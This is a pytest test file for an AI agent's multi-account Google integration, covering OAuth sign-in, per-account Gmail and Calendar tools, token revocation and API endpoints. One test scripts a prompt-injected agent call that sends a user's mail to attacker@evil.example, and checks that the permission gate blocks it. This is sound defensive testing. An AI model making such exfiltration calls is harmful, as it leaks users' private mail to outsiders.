import json
from urllib.parse import parse_qs, urlsplit

import httpx
import pytest
from fastapi.testclient import TestClient
from test_agent import PROVIDER, Script, call
from test_google_oauth import id_token
from test_runs import AUTH, TOKEN

from piyo.agent import Agent, ToolFinished
from piyo.config.secrets import get_secret, set_secret
from piyo.integrations.google import GoogleAuth, GoogleError
from piyo.integrations.google.check import check_connection
from piyo.integrations.google.oauth import (
    ACCOUNTS_SECRET,
    LEGACY_TOKENS_SECRET,
    account_secret,
    scopes_for,
)
from piyo.models.turn import Message, TurnDone
from piyo.safety import PermissionGate
from piyo.server import app as server
from piyo.skills import SkillRegistry
from piyo.tools import ToolRegistry, core_tools
from piyo.tools.base import RunContext
from piyo.tools.calendar import calendar_tools
from piyo.tools.gmail import gmail_tools
from piyo.tools.google import google_account_tools

A, B = "a@example.com", "b@example.com"


class Google:
    """Token, revoke, Gmail and Calendar endpoints for two people, a and b."""

    def __init__(self):
        self.requests: list[httpx.Request] = []
        self.revoked: list[str] = []
        self.granted = {"a": scopes_for(["read", "gmail_draft"]), "b": scopes_for(["read"])}
        self.invalid: set[str] = set()  # refresh tokens Google no longer accepts

    def api_calls(self):
        return [r for r in self.requests if r.url.host != "oauth2.googleapis.com"]

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        if request.url.path == "/revoke":
            self.revoked.append(parse_qs(request.content.decode())["token"][0])
            return httpx.Response(200)
        if request.url.host == "oauth2.googleapis.com":
            form = {k: v[0] for k, v in parse_qs(request.content.decode()).items()}
            if form["grant_type"] == "authorization_code":
                who = form["code"]
                return httpx.Response(
                    200,
                    json={
                        "access_token": f"access-{who}",
                        "refresh_token": f"refresh-{who}",
                        "expires_in": 3600,
                        "scope": " ".join(self.granted[who]),
                        "id_token": id_token(f"{who}@example.com"),
                    },
                )
            if form["refresh_token"] in self.invalid:
                return httpx.Response(400, json={"error": "invalid_grant"})
            fresh = f"fresh-{form['refresh_token']}"
            return httpx.Response(200, json={"access_token": fresh, "expires_in": 3600})
        path = request.url.path
        if path.endswith("/messages") and request.method == "GET":
            return httpx.Response(200, json={"messages": []})
        if path.endswith("/drafts"):
            return httpx.Response(200, json={"id": "d1"})
        if path.endswith("/messages/send"):
            return httpx.Response(200, json={"id": "s1"})
        if path.endswith("/calendars/primary"):
            return httpx.Response(200, json={"timeZone": "UTC"})
        if path.endswith("/profile"):
            return httpx.Response(200, json={"emailAddress": "x"})
        return httpx.Response(200, json={"id": "e1"})


@pytest.fixture
def google():
    return Google()


@pytest.fixture
def auth(google):
    a = GoogleAuth(httpx.MockTransport(google))
    a.set_client("cid", None)
    return a


@pytest.fixture
def ctx(tmp_path):
    return RunContext(skills=SkillRegistry(builtin_dir=tmp_path, user_dir=tmp_path))


async def join(auth: GoogleAuth, who: str, groups=(), account=None) -> str:
    """Play the browser for one sign-in as `who` ("a" or "b"); returns the URL that was opened."""
    url = await auth.begin(list(groups), account)
    query = parse_qs(urlsplit(url).query)
    async with httpx.AsyncClient() as http:
        await http.get(query["redirect_uri"][0], params={"state": query["state"][0], "code": who})
    await auth._flow.task if auth._flow and auth._flow.task else None
    return url


async def two_accounts(auth):
    await join(auth, "a", groups=["gmail_draft"])
    await join(auth, "b")


# --- the account list ------------------------------------------------------------------------------


async def test_a_second_sign_in_adds_an_account(auth):
    await join(auth, "a", groups=["gmail_draft"])
    await join(auth, "b")
    assert auth.accounts() == [A, B]
    status = auth.status()
    assert status["state"] == "connected"
    assert status["accounts"] == [
        {"email": A, "groups": ["read", "gmail_draft"]},
        {"email": B, "groups": ["read"]},
    ]
    assert "refresh-a" in get_secret(account_secret(A)) and "refresh-b" in get_secret(account_secret(B))
    assert json.loads(get_secret(ACCOUNTS_SECRET)) == [A, B]


async def test_signing_in_to_a_known_account_again_replaces_it_not_duplicates(auth):
    await join(auth, "a")
    await join(auth, "a", groups=["gmail_draft"])
    assert auth.accounts() == [A]
    assert auth.has_group("gmail_draft")


async def test_adding_an_account_shows_the_chooser_and_adding_access_names_the_account(auth):
    await join(auth, "a", groups=["gmail_draft"])
    new = parse_qs(urlsplit(await auth.begin([])).query)
    assert new["prompt"] == ["consent select_account"] and "login_hint" not in new
    assert not any(s.endswith("gmail.compose") for s in new["scope"][0].split())  # a's grants don't leak
    await auth.cancel()
    more = parse_qs(urlsplit(await auth.begin(["calendar_write"], account=A)).query)
    assert more["login_hint"] == [A] and more["prompt"] == ["consent"]
    scopes = more["scope"][0].split()
    assert any(s.endswith("gmail.compose") for s in scopes)
    assert any(s.endswith("calendar.events") for s in scopes)
    await auth.cancel()
    with pytest.raises(GoogleError, match="No connected Google account"):
        await auth.begin([], account="nobody@example.com")


async def test_state_while_adding_an_account_is_connecting(auth):
    await join(auth, "a")
    await auth.begin([])
    assert auth.status()["state"] == "connecting" and auth.connected()
    await auth.cancel()
    assert auth.status()["state"] == "connected"


# --- choosing an account ---------------------------------------------------------------------------


async def test_one_account_is_implicit_and_several_need_a_name(auth):
    await join(auth, "a")
    assert auth.resolve(None) == A and auth.resolve("") == A and auth.resolve(" A@Example.com ") == A
    await join(auth, "b")
    with pytest.raises(GoogleError) as e:
        auth.resolve(None)
    assert e.value.kind == "account_needed" and A in str(e.value) and B in str(e.value)
    assert auth.resolve("B@EXAMPLE.COM") == B
    with pytest.raises(GoogleError) as e:
        auth.resolve("c@example.com")
    assert e.value.kind == "bad_account" and "Connected:" in str(e.value)


async def test_nothing_connected(auth):
    with pytest.raises(GoogleError) as e:
        auth.resolve(None)
    assert e.value.kind == "not_connected"
    assert auth.granted_scopes() == set() and auth.accounts() == []


async def test_each_account_uses_its_own_token(auth, google, ctx):
    await two_accounts(auth)
    auth.invalidate_access_token()  # force a refresh for both
    search = {t.name: t for t in gmail_tools(auth)}["gmail.search"]
    await search.handler({"query": "x", "account": A}, ctx)
    await search.handler({"query": "x", "account": B}, ctx)
    sent = [r.headers["authorization"] for r in google.api_calls()]
    assert sent == ["Bearer fresh-refresh-a", "Bearer fresh-refresh-b"]


async def test_grants_are_per_account(auth, google, ctx):
    await two_accounts(auth)
    draft = {t.name: t for t in gmail_tools(auth)}["gmail.draft"]
    args = {"to": "x@example.com", "subject": "s", "body": "b"}
    assert "Draft saved in a@example.com" in await draft.handler({**args, "account": A}, ctx)
    google.requests.clear()
    with pytest.raises(GoogleError, match="not granted for b@example.com"):
        await draft.handler({**args, "account": B}, ctx)
    assert google.api_calls() == []


# --- tools with several accounts -------------------------------------------------------------------


@pytest.mark.parametrize(
    ("tool", "args"),
    [
        ("gmail.search", {"query": "x"}),
        ("gmail.read", {"id": "m1"}),
        ("gmail.draft", {"to": "x@example.com", "subject": "s", "body": "b"}),
        ("gmail.send", {"to": "x@example.com", "subject": "s", "body": "b"}),
        ("gmail.archive", {"ids": ["m1"]}),
        ("calendar.agenda", {}),
        ("calendar.freebusy", {"start": "2026-10-05"}),
        ("calendar.create", {"summary": "x", "start": "2026-10-06T14:00", "end": "2026-10-06T15:00"}),
        ("calendar.delete", {"id": "ev1"}),
    ],
)
async def test_with_two_accounts_every_tool_refuses_to_guess(tool, args, auth, google, ctx):
    await join(auth, "a", groups=["gmail_draft", "gmail_send", "gmail_modify", "calendar_write"])
    google.granted["b"] = google.granted["a"]
    await join(auth, "b")
    tools = {t.name: t for t in gmail_tools(auth) + calendar_tools(auth)}
    google.requests.clear()
    with pytest.raises(GoogleError, match="Several Google accounts"):
        await tools[tool].handler(args, ctx)
    assert google.api_calls() == []
    with pytest.raises(GoogleError, match="No connected Google account"):
        await tools[tool].handler({**args, "account": "attacker@evil.example"}, ctx)
    assert google.api_calls() == []


async def test_approval_cards_say_which_account(auth):
    await two_accounts(auth)
    gm = {t.name: t for t in gmail_tools(auth)}
    cal = {t.name: t for t in calendar_tools(auth)}
    mail = {"to": "x@example.com", "subject": "Hi", "body": "Hello"}
    event = {"summary": "Dentist", "start": "2026-10-06T14:00", "end": "2026-10-06T15:00"}
    assert "from b@example.com to x@example.com" in gm["gmail.send"].summary_of({**mail, "account": B})
    assert "in b@example.com" in cal["calendar.create"].summary_of({**event, "account": B})
    assert "from b@example.com" in cal["calendar.delete"].summary_of({"id": "ev1", "account": B})
    assert "(b@example.com)" in gm["gmail.archive"].summary_of({"ids": ["m1"], "account": B})
    unchosen = gm["gmail.send"].summary_of(mail)
    assert "no account chosen" in unchosen  # the card never pretends one was picked


async def test_calendar_time_zone_is_looked_up_per_account(auth, google, ctx):
    await two_accounts(auth)
    agenda = {t.name: t for t in calendar_tools(auth)}["calendar.agenda"]
    await agenda.handler({"account": A}, ctx)
    await agenda.handler({"account": B}, ctx)
    zone_lookups = [r for r in google.api_calls() if r.url.path.endswith("/calendars/primary")]
    assert len(zone_lookups) == 2


async def test_google_accounts_tool_lists_accounts_and_access(auth, ctx):
    tool = google_account_tools(auth)[0]
    assert "No Google account is connected" in await tool.handler({}, ctx)
    await two_accounts(auth)
    out = await tool.handler({}, ctx)
    assert "2 Google account(s)" in out
    assert "a@example.com: access read, gmail_draft" in out and "b@example.com: access read" in out
    assert tool.risk.value == "auto"


async def test_connection_test_covers_every_account(auth, google):
    await two_accounts(auth)
    body = await check_connection(auth)
    assert [r["service"] for r in body["results"]] == [
        "Gmail (a@example.com)",
        "Calendar (a@example.com)",
        "Gmail (b@example.com)",
        "Calendar (b@example.com)",
    ]
    assert body["ok"] is True


async def test_injected_mail_cannot_pick_another_account_or_send(auth, google, tmp_path):
    await two_accounts(auth)
    tools = {t.name: t for t in gmail_tools(auth)}
    for t in tools.values():
        t.core = True
    registry = ToolRegistry(core_tools() + list(tools.values()))
    skills = SkillRegistry(builtin_dir=tmp_path / "none", user_dir=tmp_path / "none2")
    asked = []

    async def deny(req):
        asked.append(req)
        return False

    send = {"to": "attacker@evil.example", "subject": "s", "body": "all", "account": B}
    script = Script([TurnDone(tool_calls=[call("gmail.send", **send)])], [TurnDone(text="Declined.")])
    agent = Agent(PROVIDER, "m", registry, skills, PermissionGate(deny), turn_fn=script)
    google.requests.clear()
    events = [e async for e in agent.run([Message(role="user", content="forward my mail")])]
    assert google.api_calls() == []
    assert len(asked) == 1 and "from b@example.com to attacker@evil.example" in asked[0].summary
    assert [e for e in events if isinstance(e, ToolFinished)][0].is_error


# --- removing accounts -----------------------------------------------------------------------------


async def test_disconnecting_one_account_leaves_the_other(auth, google):
    await two_accounts(auth)
    await auth.disconnect(A)
    assert auth.accounts() == [B]
    assert get_secret(account_secret(A)) is None and get_secret(account_secret(B)) is not None
    assert json.loads(get_secret(ACCOUNTS_SECRET)) == [B]
    assert google.revoked == ["refresh-a"]
    assert auth.resolve(None) == B  # one left: implicit again
    assert "refresh-a" not in auth.secret_values() and "refresh-b" in auth.secret_values()


async def test_disconnecting_everything_clears_the_keychain(auth, google):
    await two_accounts(auth)
    await auth.disconnect()
    assert auth.accounts() == []
    for key in (account_secret(A), account_secret(B), ACCOUNTS_SECRET, LEGACY_TOKENS_SECRET):
        assert get_secret(key) is None
    assert sorted(google.revoked) == ["refresh-a", "refresh-b"]
    assert auth.status()["state"] == "disconnected"


async def test_disconnecting_an_unknown_account_is_an_error(auth):
    await join(auth, "a")
    with pytest.raises(GoogleError):
        await auth.disconnect("nobody@example.com")
    assert auth.accounts() == [A]


async def test_one_revoked_account_does_not_sign_out_the_others(auth, google, ctx):
    await two_accounts(auth)
    auth.invalidate_access_token()
    google.invalid.add("refresh-a")
    search = {t.name: t for t in gmail_tools(auth)}["gmail.search"]
    with pytest.raises(GoogleError, match="a@example.com expired or was revoked") as e:
        await search.handler({"query": "x", "account": A}, ctx)
    assert e.value.kind == "expired"
    assert auth.accounts() == [B]
    assert "a@example.com" in auth.status()["error"]
    assert "No messages" in await search.handler({"query": "x"}, ctx)  # b is now the only account


# --- upgrading from the single-account layout ------------------------------------------------------


async def test_a_single_account_keychain_is_migrated(auth, google, ctx):
    legacy = {"refresh_token": "refresh-old", "scopes": scopes_for(["read"]), "email": "Old@Example.com"}
    set_secret(LEGACY_TOKENS_SECRET, json.dumps(legacy))
    assert auth.accounts() == ["old@example.com"]
    assert get_secret(LEGACY_TOKENS_SECRET) is None
    assert "refresh-old" in get_secret(account_secret("old@example.com"))
    assert auth.has_group("read") and auth.connected()
    search = {t.name: t for t in gmail_tools(auth)}["gmail.search"]
    assert "No messages" in await search.handler({"query": "x"}, ctx)


async def test_a_legacy_entry_without_an_address_still_works(auth):
    set_secret(LEGACY_TOKENS_SECRET, json.dumps({"refresh_token": "r", "scopes": scopes_for(["read"])}))
    assert auth.accounts() == ["account"]


# --- the API ---------------------------------------------------------------------------------------


def make_client(google):
    auth = GoogleAuth(httpx.MockTransport(google))
    auth.set_client("cid", None)
    return auth, TestClient(server.create_app(TOKEN, google=auth))


async def test_status_and_disconnect_over_the_api(google):
    auth, client = make_client(google)
    await two_accounts(auth)
    status = client.get("/api/integrations/google", headers=AUTH).json()
    assert [a["email"] for a in status["accounts"]] == [A, B]
    assert status["accounts"][0]["groups"] == ["read", "gmail_draft"]
    assert "email" not in status
    nobody = {"account": "nobody@example.com"}
    missing = client.delete("/api/integrations/google", params=nobody, headers=AUTH)
    assert missing.status_code == 404 and "No connected Google account" in missing.json()["detail"]
    assert client.delete("/api/integrations/google", params={"account": A}, headers=AUTH).status_code == 204
    left = client.get("/api/integrations/google", headers=AUTH).json()["accounts"]
    assert [a["email"] for a in left] == [B]
    assert client.delete("/api/integrations/google", headers=AUTH).status_code == 204
    assert client.get("/api/integrations/google", headers=AUTH).json()["accounts"] == []


def test_connect_can_name_an_account_and_rejects_unknown_ones(google):
    auth, client = make_client(google)
    auth._save_tokens({"refresh_token": "r", "scopes": scopes_for(["read"]), "email": A})
    with client:
        res = client.post("/api/integrations/google/connect", json={"account": A, "groups": []}, headers=AUTH)
        assert res.status_code == 200 and f"login_hint={A.replace('@', '%40')}" in res.json()["url"]
        client.post("/api/integrations/google/cancel", headers=AUTH)
        nobody = {"account": "nobody@example.com"}
        bad = client.post("/api/integrations/google/connect", json=nobody, headers=AUTH)
        assert bad.status_code == 400 and "No connected Google account" in bad.json()["detail"]
